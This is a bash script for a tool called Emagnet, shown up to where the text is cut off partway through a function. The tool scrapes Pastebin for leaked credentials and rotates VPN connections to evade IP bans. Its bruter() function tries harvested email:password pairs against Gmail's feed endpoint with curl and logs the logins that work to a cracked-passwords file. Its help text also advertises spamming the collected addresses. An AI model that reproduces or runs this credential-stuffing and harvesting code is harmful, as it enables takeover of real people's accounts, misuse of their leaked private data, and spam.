#!/bin/bash
################################################################################
################################################################################
####                                                                       #####
#### A notice to all nerds.                                                #####
#### If you will copy developers real work it will not make you a hacker.  #####
#### Resepect all developers, we doing this because it's fun!              #####
####                                                                       #####
################################################################################
################################ SOURCE CODE ###################################
################################################################################
###################### EMAGNET WAS FOUNDED BY WUSEMAN ##########################
################################################################################
####                                                                       #####
####  Emagnet - A tool for find all latest leaked databases                #####
####  Copyright (C) 2018-2019, wuseman                                     #####
####                                                                       #####
####  This program is free software; you can redistribute it and/or modify #####
####  it under the terms of the GNU General Public License as published by #####
####  the Free Software Foundation; either version 2 of the License, or    #####
####  (at your option) any later version.                                  #####
####                                                                       #####
####  This program is distributed in the hope that it will be useful,      #####
####  but WITHOUT ANY WARRANTY; without even the implied warranty of       #####
####  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #####
####  GNU General Public License for more details.                         #####
####                                                                       #####
####  You must obey the GNU General Public License. If you will modify     #####
####  emagnet file(s), you may extend this exception to your version       #####
####  of the file(s), but you are not obligated to do so.  If you do not   #####
####  wish to do so, delete this exception statement from your version.    #####
####  If you delete this exception statement from all source files in the  #####
####  program, then also delete it here.                                   #####
####                                                                       #####
####  Contact:                                                             #####
####          IRC: Freenode @ wuseman                                      #####
####          Mail: wuseman <wuseman@nr1.nu>                               #####
####                                                                       #####
################################################################################
######## The Nr1 tool for find latest leaked databases online @ 2o18 ###########
################################################################################
CONF="/etc/emagnet.conf"

################################################################################
#### Emagnet require root for we must install packages for 7example.........####
################################################################################
if [[ $(whoami) != root ]]; then
     printf "emagnet: internal error -- root privileges is required\n"
     exit 0
fi

###############################################################################
#### Check if its the first time a user running emagnet.....................####
################################################################################
if ! [[ $1 = "--setup" ]]; then
 if ! [[ -f "/etc/emagnet.conf" ]];then
  echo "emagnet: internal error -- you may wanna run emagnet-setup.sh?"
  exit 1
 fi
fi

###############################################################################
#### Emagnet's MASKOT......................................................####
###############################################################################
banner() {
cat << "EOF"
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'

EOF
printf "%64s \n\n" | tr ' ' '='
}
################################################################################
#### Usage/Help for emagnet.................................................####
################################################################################
usage() {
cat << "EOF"

Usage: ./emagnet [--author] [--emagnet] [--option] .....

  -a, --author        Show author information.
  -l, --license       Show license information.
  -h, --help          Display this very helpful text
  -S, --setup         Run emagnet-setup.sh again
  -t, --time          Set refresh time
  -v, --vpn           Toggle VPN on or off (true/false)
  -V, --version       Displays version information.

  -b, --backup        Create a compressed archive
  -d, --stats         Print stats from all folders
  -e, --emagnet       Download latest uploads and store leaked dbs
  -g, --bruteforce    Same as '-e' with brute-force mode on
  -i, --ip            Print you current WAN IPv4/IPv6
  -k, --kill          Kill emagnet sessions
  -m, --move          Move files to archive
  -q, --quiet         Run in screen
  -s, --spam          Spam email addresses we found today
  -x, --syntax        Download uploads sorted by syntax

EOF
}

################################################################################
#### We must have a proper internet connection for run emagnet..............####
################################################################################
iconnection() {
ping -i 0.2 -c 1 1.1.1.1 &> /dev/null
if [[ $? -gt "0" ]]; then
     echo "It seems you're not connected to internet properly, aborted"
     exit 1
fi
}

################################################################################
#### If there is any variable that has been removed we gonna re-add paths...####
#### otherwise emagnet will stop............................................####
################################################################################
mustbefilled() {
source $CONF
if [[ -z $DEBUG          ]];   then sed -i "12d"  $CONF;sed -i '12  i DEBUG=false'                                               $CONF;fi
if [[ -z $PASTEBIN       ]];   then sed -i '21d'  $CONF;sed -i '21  i PASTEBIN=https:\/\/www.pastebin.com\/archive'              $CONF;fi

if [[ -z $WIP            ]];   then sed -i '50d'  $CONF;sed -i '50  i WIP=https:\/\/nr1.nu\/i\/'                                 $CONF;fi
if [[ -z $WIP2           ]];   then sed -i '51d'  $CONF;sed -i '51  i WIP2='                                                     $CONF;fi
if [[ -z $WIP3           ]];   then sed -i '52d'  $CONF;sed -i '52  i WIP3='                                                     $CONF;fi
if [[ -z $WIP4           ]];   then sed -i '53d'  $CONF;sed -i '53  i WIP4='                                                     $CONF;fi

if [[ -z $EMAGNETHOME    ]];   then sed -i "73d"  $CONF;sed -i '73 i EMAGNETHOME=$EMAGNET\/incoming\/$(date +%Y-%m-%d)'          $CONF;fi
if [[ -z $EMAGNETLOGS    ]];   then sed -i "74d"  $CONF;sed -i '74 i EMAGNETLOGS=$EMAGNETHOME/logs'                              $CONF;fi
if [[ -z $EMAGNETPW      ]];   then sed -i "75d"  $CONF;sed -i '75 i EMAGNETPW=$EMAGNETHOME\/password-files'                     $CONF;fi
if [[ -z $EMAGNETALL     ]];   then sed -i "76d"  $CONF;sed -i '76 i EMAGNETALL=$EMAGNETHOME\/all-files'                         $CONF;fi
if [[ -z $EMAGNETCRAP    ]];   then sed -i "77d"  $CONF;sed -i '77 i EMAGNETCRAP=$EMAGNETHOME\/.pastebin'                        $CONF;fi
if [[ -z $EMAGNETTEMP    ]];   then sed -i "78d"  $CONF;sed -i '78 i EMAGNETTEMP=$EMAGNETHOME\/.temp'                            $CONF;fi
if [[ -z $EMAGNETARCHIVE ]];   then sed -i "79d"  $CONF;sed -i '79 i EMAGNETARCHIVE=$EMAGNET/archive'                            $CONF;fi
if [[ -z $EMAGNETDB      ]];   then sed -i "80d"  $CONF;sed -i '80 i EMAGNETDB=$EMAGNETHOME\/email-files'                        $CONF;fi
if [[ -z $EMAGNETBACKUP  ]];   then sed -i "81d"  $CONF;sed -i '81 i EMAGNETBACKUP=$EMAGNET/backup'                              $CONF;fi
if [[ -z $EMAGNETSYNTAX  ]];   then sed -i "82d"  $CONF;sed -i '82 i EMAGNETDB=$EMAGNETHOME\/sorted-by-syntax'                   $CONF;fi

if [[ -z $VERSION        ]];   then sed -i '91d'  $CONF;sed -i '91  i VERSION=3.1'                                               $CONF;fi
if [[ -z $THREADS        ]];   then sed -i '100d' $CONF;sed -i "100 i THREADS=1"                                                 $CONF;fi
if [[ -z $IDLETIME       ]];   then sed -i '109d' $CONF;sed -i "109 i IDLETIME=3600"                                             $CONF;fi
if [[ -z $GBRUTEFORCE    ]];   then sed -i '118d' $CONF;sed -i '118 i GBRUTEFORCE=false'                                         $CONF;fi
if [[ -z $SBRUTEFORCE    ]];   then sed -i '119d' $CONF;sed -i '119 i SBRUTEFORCE=false'                                         $CONF;fi
if [[ -z $EMAIL2SEND     ]];   then sed -i '128d' $CONF;sed -i '128 i EMAIL2SEND='                                               $CONF;fi
if [[ -z $NOTIFY         ]];   then sed -i '137d' $CONF;sed -i '137 i NOTIFY=false'                                              $CONF;fi

if [[ -z $VPN            ]];   then sed -i '149d' $CONF;sed -i '149 i VPN=false'                                                 $CONF;fi
if [[ -z $VPNROOT        ]];   then sed -i '150d' $CONF;sed -i '150 i VPNROOT=/etc/openvpn'                                      $CONF;fi
if [[ -z $VPNPROVIDER    ]];   then sed -i '151d' $CONF;sed -i '151 i VPNPROVIDER=$VPNROOT/'                                     $CONF;fi
if [[ -z $VPNPROVIDER2   ]];   then sed -i '152d' $CONF;sed -i '152 i VPNPROVIDER2=$VPNROOT/'                                    $CONF;fi
if [[ -z $VPNPROVIDER3   ]];   then sed -i '153d' $CONF;sed -i '153 i VPNPROVIDER3=$VPNROOT/'                                   $CONF;fi
if [[ -z $VPNCOUNTRYS    ]];   then sed -i '154d' $CONF;sed -i '154 i VPNCOUNTRYS="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'                                            $CONF;fi
if [[ -z $VPNCOUNTRYS2   ]];   then sed -i '155d' $CONF;sed -i '155 i VPNCOUNTRYS2="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'                                           $CONF;fi
if [[ -z $VPNCOUNTRYS3   ]];   then sed -i '156d' $CONF;sed -i '156 i VPNCOUNTRYS3="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'                                           $CONF;fi

if [[ -z $SSHUSER        ]];   then sed -i '168d' $CONF;sed -i '168 i SSHUSER="root"'                                            $CONF;fi
if [[ -z $SSHPORT        ]];   then sed -i '169d' $CONF;sed -i '169 i SSHPORT="22"'                                              $CONF;fi
if [[ -z $SSHTARGETS     ]];   then sed -i '170d' $CONF;sed -i '170 i SSHTARGETS="/tmp/.emagnet-sshbruter.txt"'                  $CONF;fi
if [[ -z $SSHWORDLIST    ]];   then sed -i '171d' $CONF;sed -i '171 i SSHWORDLIST=""'                                            $CONF;fi
source $CONF
}

################################################################################
#### Create paths for emagnet if there is no incoming path created..........####
################################################################################
paths() {
     if [[ ! -d $EMAGNETHOME    ]];    then mkdir -p $EMAGNETHOME     &> /dev/null;  fi
     if [[ ! -d $EMAGNETDB      ]];    then mkdir -p $EMAGNETDB       &> /dev/null;  fi
     if [[ ! -d $EMAGNETPW      ]];    then mkdir -p $EMAGNETPW       &> /dev/null;  fi
     if [[ ! -d $EMAGNETTEMP    ]];    then mkdir -p $EMAGNETTEMP     &> /dev/null;  fi
     if [[ ! -d $EMAGNETCRAP    ]];    then mkdir -p $EMAGNETCRAP     &> /dev/null;  fi
     if [[ ! -d $EMAGNETALL     ]];    then mkdir -p $EMAGNETALL      &> /dev/null;  fi
     if [[ ! -d $EMAGNETARCHIVE ]];    then mkdir -p $EMAGNETARCHIVE  &> /dev/null;  fi
     if [[ ! -d $EMAGNETLOGS    ]];    then mkdir -p $EMAGNETLOGS     &> /dev/null;  fi
}

######################################################################################################
#### Sometimes pastebin is under heavy load,  then we print this instead of an empty result.......####
#### and we gonna let emagnet wait for 60 seconds until we continues..............................####
######################################################################################################
heavyload() {
$BROWSER -dump $PASTEBIN|grep -q "is under heavy load right now"
if [[ $? = "0" ]]; then
 for (( ; ; )); do
 wait_time=60
 temp_cnt=${wait_time}
 while [[ ${temp_cnt} -gt 0 ]]; do
        printf "\rPastebin is currently under heavy load, let's wait: \e[1;1m%1d\e[0m" ${temp_cnt};printf " seconds";sleep 1;((temp_cnt--))
done;
      echo ""
      bash emagnet --emagnet
done
      bash emagnet --emagnet
fi
}

Iwasbanned() {
CONF="/etc/emagnet.conf"
source /etc/emagnet.conf
$BROWSER -dump $PASTEBIN|grep -q "blocked your IP"
if [[ $? = "0" ]]; then
clear
banner
if [[ $VPN = "false" ]]; then
for (( ; ; )); do
wait_time=$IDLETIME
temp_cnt=${wait_time}
while [[ ${temp_cnt} -gt 0 ]]; do
    printf "\rIP: [\e[1;31m$(curl -s $WIP)\e[0m] has been blocked, continues in \e[1;1m%1d\e[0m" ${temp_cnt}
    printf " seconds";sleep 1;((temp_cnt--))
    
done;

    printf "\n"
    clear;banner
    bash emagnet --emagnet
    sleep 2
done
    clear;banner
    bash emagnet --emagnet
exit
else
  banned
fi
fi
}

vpnsetup() {
VPNCONFIG=$(awk -F'/' '/VPNPROVIDER/ {print $2}' /etc/emagnet.conf|cut -d'"' -f1|head -2|sed '1d')
VPNCONFIG2=$(awk -F'/' '/VPNPROVIDER/ {print $2}' /etc/emagnet.conf|cut -d'"' -f1|head -2|tail -1)
VPNCONFIG3=$(awk -F'/' '/VPNPROVIDER/ {print $2}' /etc/emagnet.conf|cut -d'"' -f1|head -3|tail -1)

case $COUNTRY in
 belgium)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.be.ovpn      &> /dev/null & ;;
 bulgaria)       cd $VPNPROVIDER;openvpn --config $VPNCONFIG.bg.ovpn      &> /dev/null & ;;
 czech)          cd $VPNPROVIDER;openvpn --config $VPNCONFIG.cz.ovpn      &> /dev/null & ;;
 denmark)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.dk.ovpn      &> /dev/null & ;;
 spain)          cd $VPNPROVIDER;openvpn --config $VPNCONFIG.es.ovpn      &> /dev/null & ;;
 finland)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.fi.ovpn      &> /dev/null & ;;
 united-kingdom) cd $VPNPROVIDER;openvpn --config $VPNCONFIG.gb.ovpn      &> /dev/null & ;;
 greece)         cd $VPNPROVIDER;openvpn --config $VPNCONFIG.gr.ovpn      &> /dev/null & ;;
 hongkong)       cd $VPNPROVIDER;openvpn --config $VPNCONFIG.hk.ovpn      &> /dev/null & ;;
 hungaria)       cd $VPNPROVIDER;openvpn --config $VPNCONFIG.hu.ovpn      &> /dev/null & ;;
 italy)          cd $VPNPROVIDER;openvpn --config $VPNCONFIG.it.ovpn      &> /dev/null & ;;
 moldavia)       cd $VPNPROVIDER;openvpn --config $VPNCONFIG.md.ovpn      &> /dev/null & ;;
 netherlands)    cd $VPNPROVIDER;openvpn --config $VPNCONFIG.nl.ovpn      &> /dev/null & ;;
 norway)         cd $VPNPROVIDER;openvpn --config $VPNCONFIG.no.ovpn      &> /dev/null & ;;
 poland)         cd $VPNPROVIDER;openvpn --config $VPNCONFIG.pl.ovpn      &> /dev/null & ;;
 portugal)       cd $VPNPROVIDER;openvpn --config $VPNCONFIG.pt.ovpn      &> /dev/null & ;;
 romania)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.ro.ovpn      &> /dev/null & ;;
 russia)         cd $VPNPROVIDER;openvpn --config $VPNCONFIG.rs.ovpn      &> /dev/null & ;;
 sweden)         cd $VPNPROVIDER;openvpn --config $VPNCONFIG.se.ovpn      &> /dev/null & ;;
 sweden1)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.se-got.ovpn  &> /dev/null & ;;
 sweden2)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.se-hel.ovpn  &> /dev/null & ;;
 sweden3)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.se-mma.ovpn  &> /dev/null & ;;
 sweden4)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.se-sto.ovpn  &> /dev/null & ;;
 united-states)  cd $VPNPROVIDER;openvpn --config $VPNCONFIG.us.ovpn      &> /dev/null & ;;
esac
}


banned() {
if [[ $VPN = "false" ]]; then
Iwasbanned
  else
line='...........................................................'
line1='................................[ ok ]'
line2='...............................................'
curl -s $WIP > /tmp/.emagnet-ip
OPENVPNRUNNING="$(ps aux |grep openvpn|sed '1d')"
MYOLDIP="$(cat /tmp/.emagnet-ip)"
MYIP="$(curl -s https://nr1.nu/i/)"
MYCOUNTRY="$(curl -s https://nr1.nu/i/|xargs whois|grep -i COUNTRY|awk '{print tolower($2)}')"

startvpn() {
clear;banner
pkill -9 openvpn
printf "\e[1;31m                You have been blocked by pastebin...\n\n\e[0m"
printf "%s${line2:${#MYIP}}[ ok ]\n" "Current IP: $MYIP"
COUNTRY=$(awk -F'="' '/VPNCOUNTRYS="/ {print $2}' /etc/emagnet.conf|sed 's/"//g'|tr ' ' '\n'|shuf -n1)
printf "Connecting to ";printf "\e[1m%s\e[0m%s \e[1;37m%s\e[0m" $COUNTRY ", please wait${line1:${#COUNTRY}}"
printf "\n"

vpnsetup
if [[ -z $VPNCOUNTRYS ]]; then
    VPNCONFIG="$VPNPROVIDER"
    VPNCONFIG="$VPNCOUNTRYS"
elif [[ -z $VPNCOUNTRYS2 ]]; then
    VPNCONFIG="$VPNPROVIDER2"
    VPNCONFIG="$VPNCOUNTRYS2"
elif [[ -z $VPNCOUNTRYS3 ]]; then
    VPNCONFIG="$VPNPROVIDER3"
    COUNTRY="$VPNCOUNTRYS3"
else
    sed -i 's/VPN=true/VPN=false/g' $CONF
fi
}

connected() {
     MYIP="$(curl -s https://nr1.nu/i/)"
     if [[ $MYIP = "$MYOLDIP" ]]; then
     sleep 5
     fi
}
     startvpn
     sleep 1
     connected
     sleep 10
     MYIP="(curl https://nr1.nu/i/)"
if [[ $MYOLDIP = "$MYIP" ]]; then
     MYNEWIP=$(printf "Successfully connected to $(echo  "$(curl -s https://nr1.nu/i/)")")
     printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
     printf "\rEmagnet will continue in 5 seconds.......................[ ok ]\n\n"
     sleep 5
else
if ! [[ $(echo $MYNEWIP|awk '{print $4}') = "$MYIP" ]]; then
     echo -e "Still trying to establish a connection.....................[\e[1;3mwait\e[0m]"
     sleep 10
     MYIP="(curl https://nr1.nu/i/)"
     MYOLDIP="$(cat /tmp/.emagnet-ip)"
if [[ $MYOLDIP = "$MYIP" ]]; then
     echo -e "It seems to be some trouble with the connection, aborted.[\e[1;31mfail\e[0m]\nAborted."
     exit 1
else
     MYNEWIP=$(echo -e "Successfully connected to $(curl -s https://nr1.nu/i/)")
     printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
     printf "\rEmagnet will continue in 5 seconds.........................[ ok ]\n\n"
     sleep 5
fi
fi
fi
fi
}

################################################################################
#### This is set if MYIP has been removed or is not SET for users security..####
################################################################################
checkip() {
if [[ -z "$MYIP" ]]; then
      echo -e "\n\n\033[1mIP-ADDRESS SETUP:\033[0m\n\033[1m----------------------\033[0m"
      echo -e "Set your private ip here if you don't wanna take the risk to get"
      echo -e "your 'private' ip number banned on www.pastebin.com for around"
      echo -e "a time limit of ~1200-1600 seconds. Remember this will happends if"
      echo -e "you will set time limit to 59 seconds or less in next option.\n"
      echo -e "If this is something you don't care about then please just hit"
      echo -e "enter and set your ip to 0.0.0.0. If you wont do this and time"
      echo -e "has been set to <59s emagnet will warn you about about this every"
      echo -e "time you executing emagnet.\n"
      echo -e "This setting exist so all users is aware that pastebin will ban"
      echo -e "your ip if you will visit the page too often.\n"
      echo -e "This message appears here cause you have not set any value"
      echo -e "under 'MYIP' in /etc/emagnet.conf, set 0.0.0.0 instead of removing the IP.\n"

if [[ -d "/usr/local/bin" ]]; then
  if [[ ! -f "/usr/local/bin/emagnet" ]]; then
      cp ./emagnet /usr/local/bin &> /dev/null
  fi
fi

myip="$(curl -s $WIP)"
printf "\nIs \e[1;1m$myip\e[0m your private IP-Address (yes/no): "
read realip

case "$realip" in
  YES|y|yes|Yes) sed -i '40d' $CONF;sed -i '40 i MYIP=' $CONF;sed -i "s/MYIP=/MYIP=$myip/g" $CONF;printf "\nConfig file has been updated, your IP has been set to: \e[1;1m$myip\e[0m\n"; sleep 2 ;;
   *) read -p "Enter your current real IP-Adress: " currentip;sed -i "s/MYIP=/MYIP=$currentip/g" $CONF;printf "\nConfig file has been updated, your IP has been set to: \e[1;1m$myip\e[0m\n"; sleep 2 ;;
esac
fi
}

################################################################################
#### Re-create emagnet.conf after emagnet-setup has been executed...........####
################################################################################
copyconf() {
if [[ -f .emagnetconf/emagnet.conf ]]; then 
  cp .emagnetconf/emagnet.conf.bak .emagnetconf/emagnet.conf
fi
}

################################################################################
#### Since user must be known of the risk that pastebin might be............####
#### IP-Banned PERMANENT from pastebin (Use VPN or TOR if you can...........####
#### since it's REALLY recommended..........................................####
################################################################################
safety() {
if [[ -z $MYIP ]]; then
    myyyyip="$(curl -s $WIP | sed -n '121p')"
    sed -i '30d' /etc/emagnet.conf
    sed -i "30i MYIP=" /etc/emagnet.conf
    sed -i "s/MYIP=/MYIP=$myyyyip/g" /etc/emagnet.conf
    echo "\[$(date +%d/%m/%Y\ -\ %H:%M)\]: $(whoami) - Aborted for safety, don't use your own IP!!" >> $EMAGNETLOGS/emagnet.log
fi
}

################################################################################
#### Print analyzing meanwhile we go through the files......................####
################################################################################
analyz() {
clear;banner
printf "%26s";printf A;sleep 0.1;printf n;sleep 0.1;printf a; sleep 0.1;printf l;sleep 0.1;printf y;sleep 0.1;printf z;
sleep 0.1;printf i;sleep 0.1;printf n;sleep 0.1;printf g;sleep 0.1;printf .;sleep 0.1;printf . ;printf .; sleep 0.1;printf "."; sleep 0.1;printf "\n\n"
}

#captcha() {
#$BROWSER -dump $PASTEBIN | grep -q -i captcha
#if [[ $? = "0" ]]; then
#  printf "Pastebin.com asking emagnet for accept the re-captcha.\n\n"
#  printf "Open your browser, go to https://pastebin.com and enter the re-captcha\n"
#  printf "and then you will be able to continue hopefully. If this wont help just wait for a few minutes. \n\nIf the request about captcha wont be removed after few minutes then you have\nended up in their ip-filter so you must fix a new IP or wait for a few days until\nyour IP has been removed from the filter they are using. \n\nThe last solution is to register an account on pastebin and whitlist the IP but then you\nwont be completely anonymous depending on what information you used when you created the account.\n\n"
#  if [[ $VPN = "false" ]]; then
#     sleep 5
#     rm /tmp/.emagnet &> /dev/null
#     exit 1
#  else
#  Iwasbanned
#  fi
#fi
#}

################################################################################
#### Before emagnet will run, we gonna check so everything is OK            ####
################################################################################
check4all() {
source $CONF
iconnection
mustbefilled
paths
copyconf
safety
}

################################################################################
#### If user executing emagnet without any value we printing help...........####
################################################################################
if [[ -z $1 ]]; then 
  usage
  exit 1
fi

################################################################################
###### ALL EMAGNET'S FEATURES BEGINS HERE ######################################
################################################################################
################################################################################
###### DON'T TOUCH UNLESS YOU KNOW EXACTLY WHAT YOU ARE DOING ##################
################################################################################
################################################################################
#### // wuseman ################################################################
################################################################################

################################################################################
#### Print ascii and a timer when we counting seconds to download...........####
################################################################################
analyzer() {
source $CONF
wait_time=$TIME
temp_cnt=${wait_time}
while [[ ${temp_cnt} -gt 0 ]]; do
    printf "\r         I'll Will Find You <-%2d -> It's A Matter Of Time" ${temp_cnt}
    sleep 1
((temp_cnt--))
done
}

countdown() {
if [[ $GBRUTEFORCE = "true" ]]; then
    clear; banner
    printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
    printf "\n%64s \n" | tr ' ' '='
    echo ""
    analyzer
elif [[ $GBRUTEFORCE = "false" ]]; then
    analyzer
else
    sed -i '121d' $CONF; sed '121 i GBRUTEFORCE=false' $CONF
fi
}

################################################################################
#### Check so we are not banned or being asked for captha or anything       ####
#### else might be wrong before we doing anything                           ####
################################################################################
blocked() {
    source $CONF
if [[ ! -s /tmp/.emagnet ]]; then
$BROWSER -dump $PASTEBIN > /tmp/.emagnet
fi
}

################################################################################
#### This is stats function wwhen you using emagnet -s for count stats.......####
################################################################################
stats() {
source $CONF

if ! [[ -d $EMAGNETARCHIVE/all-files ]]; then
    clear
    banner
    echo -e "[\e[0;31m<<\e[0m] - Duh! You must run emagnet before you can count any stats.\n"
    exit 1
fi
    echo
    clear; banner
    printf "[\e[1;32m>>\e[0m] - Please wait, counting data"
    printf "%s" "                           (00%)"
    sleep 1
    TOTALFILES=$(ls $EMAGNETARCHIVE/all-files | wc -l)
    clear; banner
    printf "[\e[1;32m>>\e[0m] - Please wait, counting total files.."
    printf "%s" "..                (14%)"
    sleep 0.5
    TEMAILFILES=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETARCHIVE/all-files | cut -d: -f1|uniq|sort| wc -l)
    clear; banner
    printf "[\e[1;32m>>\e[0m] - Please wait, counting email files.."
    printf "%s" "....              (39%)"
    sleep 0.5
    TPASSWORDFILES=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETARCHIVE/all-files|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'\|'>'|uniq|sort|wc -l)
    clear; banner
    printf "[\e[1;32m>>\e[0m] - Please wait, counting password files.."
    printf "%s" "......         (51%)"
    sleep 0.5
    TEMAILS=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $EMAGNETARCHIVE/all-files|awk -F, '!seen[$1]++'|wc -l)
    clear; banner
    printf "[\e[1;32m>>\e[0m] - Please wait, counting total email addresses"
    printf "%s" "........  (92%)"
    sleep 0.5
    TPASSWORDS=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETARCHIVE/all-files|awk -F, '!seen[$1]++'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ' '\|'/'\|'"'\|','\|'<'\|'>'|wc -l)
    clear; banner
    printf "[\e[1;32m>>\e[0m] - Please wait, counting total passwords.."
    printf "%s\n" ".............(100%)"
    sleep 0.5
    clear; banner
    sleep 1
    if ! [[ $TOTALFILES = "0" ]]; then
    printf '[\e[1;32m>>\e[0m] - Done, calculating stats'
    printf "%s\n\n" ".............................(100%)"
    sleep 2
    fi
    clear;banner

line='      -'
for totalfiles in $TOTALFILES; do    
  if [[ $TOTALFILES -lt "10" ]]; then
     printf "[\e[1;32m%s\e[m] %s Total files downloaded from pastebin\n" 0$TOTALFILES "${line:${#TOTALFILES}}"
  else
     printf "[\e[1;32m%s\e[m] %s Total files downloaded from pastebin\n" $TOTALFILES "${line:${#TOTALFILES}}"
  fi
done


for temails in $TEMAILS; do
  if [[ $TEMAILS -lt "10" ]]; then
     printf "[\e[1;32m%s\e[m] %s Mail addresses stored\n" 0$TEMAILS "${line:${#TEMAILS}}"
  else
     printf "[\e[1;32m%s\e[m] %s Mail addresses stored\n" $TEMAILS "${line:${#TEMAILS}}"
  fi
done

for tpasswords in $TPASSWORDS; do
  if [[ $TPASSWORDS -lt "10" ]]; then
     printf "[\e[1;32m%s\e[m] %s Passwords stored\n" 0$TPASSWORDS "${line:${#TPASSWORDS}}"
  else
     printf "[\e[1;32m%s\e[m] %s Passwords stored\n" $TPASSWORDS "${line:${#TPASSWORDS}}"
  fi
done

for temailfiles in $TEMAILFILES; do
  if [[ $TEMAILFILES -lt "10" ]]; then
     printf "[\e[1;32m%s\e[m] %s Files that have at least one email address stored\n" 0$TEMAILFILES "${line:${#TEMAILFILES}}"
else
     printf "[\e[1;32m%s\e[m] %s Files that have at least one email address stored\n" $TEMAILFILES "${line:${#TEMAILFILES}}"
  fi
done

for tpasswordsfiles in $TPASSWORDFILES; do
  if [[ $TPASSWORDFILES -lt "10" ]]; then
     printf "[\e[1;32m%s\e[m] %s Files that have at least one mail incl: password stored\nn" 0$TPASSWORDFILES "${line:${#TPASSWORDFILES}}"
  else
     printf "[\e[1;32m%s\e[m] %s Files that have at least one mail incl: password stored\n" $TPASSWORDFILES "${line:${#TPASSWORDFILES}}"
 fi
done

printf "\n%64s \n\n" | tr ' ' '='
}

################################################################################
#### This is were we hold the code for gmail brute forcing..................####
################################################################################
bruter() {
if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then
    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|grep -i gmail.com >> /tmp/.emagnet-passwords.txt 

while read -r line; do
attack=$(curl -s -u $line https://mail.google.com/mail/feed/atom|grep -o xml)
mail="$(echo $line | cut -d: -f1)"
password="$(echo $line | cut -d: -f2)"
if [[ -z "$attack" ]]; then
    printf "[-] Wrong Password For $mail: \e[1;31m$password\e[0m\n"
    echo -e "[-] $(date +%d/%m/%Y\ -\ %H:%M) -> Wrong Password For $mail $mail: \e[1;31m$password\e[0m" >> $EMAGNETLOGS/failed-to-crack.txt
fi
if [[ -n "$attack" ]]; then
    echo -e  "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
    read -p "[+] Accounts to crack has been set to 1, emagnet has been killed.\n" hey
    echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-passwords.txt
    echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"    >>    $EMAGNETLOGS/cracked-passwords.txt
    echo -e "[+]------------------------------------------------------------"      >>    $EMAGNETLOGS/cracked-passwords.txt
    echo -e "[+] Username: $mail"                                                  >>    $EMAGNETLOGS/cracked-passwords.txt
    echo -e "[+] Password: $password"                                              >>    $EMAGNETLOGS/cracked-passwords.txt
    echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-passwords.txt
fi
done < /tmp/.emagnet-passwords.txt
    rm /tmp/.emagnet-passwords.txt
    sleep 3
else
    sleep 1
fi
}

################################################################################
#### This is were we hold the code for downloading files by syntax..........####
################################################################################
emagnetsyntax() {
$BROWSER -dump $PASTEBIN/bash|grep -q "blocked your IP"
if [[ $? = "0" ]]; then
 if [[ $VPN = "true" ]]; then
    banned
 else
    echo -e "[\e[1;31m<<\e[0m] - You have been blocked by pastebin"
